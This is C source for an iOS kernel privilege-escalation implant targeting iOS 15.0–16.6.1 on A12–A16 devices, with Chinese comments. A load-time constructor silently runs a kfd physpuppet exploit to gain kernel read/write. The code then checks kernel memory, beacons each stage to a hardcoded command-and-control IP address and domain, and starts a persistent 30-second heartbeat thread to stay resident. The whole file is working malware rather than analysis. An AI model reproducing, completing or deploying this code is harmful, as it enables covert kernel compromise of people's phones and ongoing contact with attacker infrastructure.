// entry1_kfd.c — kfd landa 内核提权 entry（iOS 15.0-16.6.1 A12-A16 arm64e）
// 构建：bash build.sh（zig cc -target aarch64-macos -shared）
// 行为：加载即执行(constructor) → landa PUAF → sem_open kread/kwrite →
//       内核读写自检 → beacon 上线 → 30s 心跳循环（独立线程，宿主进程存活即保活）

#include "libkfd.h"

#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

// KFD_ADAPTED: 常量与自检适配 (16.2 / t8020)
#define PUAF_PAGES 2048ULL
#define KC_STATIC_BASE 0xfffffff007004000ULL


// ---- socket externs（zig macOS libc 头精简，运行时由 libSystem 解析）----








// ---- C2 上报（直连 IP，免 DNS）----
#ifndef C2_IP
#define C2_IP "154.222.19.165"
#endif
#ifndef C2_PATH
#define C2_PATH "/api/c2/implant-in"
#endif
#ifndef IMPLANT_UA
#define IMPLANT_UA "kfd-entry1/1.0"
#endif

static void beacon_send(const char *body) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(80);
    sa.sin_addr.s_addr = inet_addr(C2_IP);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(fd); return; }
    char req[1024];
    int n = snprintf(req, sizeof(req),
        "GET %s?msg=%s HTTP/1.1\r\n"
        "Host: maomimi.cc\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n\r\n",
        C2_PATH, body, IMPLANT_UA);
    if (n > 0) write(fd, req, (size_t)n);
    char buf[512];
    long r = read(fd, buf, sizeof(buf) - 1);
    if (r > 0) buf[r] = 0;
    close(fd);
}

static void *heartbeat_loop(void *arg) {
    (void)arg;
    while (1) {
        sleep(30);
        beacon_send("{\"e\":2,\"l\":0}");
    }
    return NULL;
}

static void *kfd_go(void *arg) {
    (void)arg;
    beacon_send("{\"e\":10,\"l\":0}"); // 提权尝试开始

    u64 kfd_uaddr = kopen(PUAF_PAGES, puaf_physpuppet,
                          kread_sem_open, kwrite_sem_open);
    if (!kfd_uaddr) { beacon_send("{\"e\":91,\"l\":0}"); return NULL; }

    // 内核读写自检：读内核静态基址 + version_off 处的 xnu 版本串
    // 内核读自检: 读 0xfffffff007004000 的 Mach-O magic
    u32 magic = 0;
    kread(kfd_uaddr, KC_STATIC_BASE, &magic, sizeof(magic));
    beacon_send("{\"e\":11,\"l\":0}");

    if (magic == 0xfeedfacf) {
        // 再验证 allproc 可读
        u64 allproc = 0;
        kread(kfd_uaddr, KC_STATIC_BASE + 0x3221180ULL, &allproc, sizeof(allproc));
        beacon_send("{\"e\":12,\"l\":1}");
        beacon_send("{\"e\":0,\"l\":0}"); // 上线成功
        pthread_t t;
        pthread_create(&t, NULL, heartbeat_loop, NULL);
        pthread_detach(t);
        while (1) sleep(3600); // 心跳线程常驻 = 长效保活
    } else {
        beacon_send("{\"e\":94,\"l\":0}");
        kclose(kfd_uaddr);
    }
    return NULL;
}

__attribute__((constructor))
static void entry1_auto(void) {
    pthread_t t;
    pthread_create(&t, NULL, kfd_go, NULL);
    pthread_detach(t);
}

int main(void){return 0;}
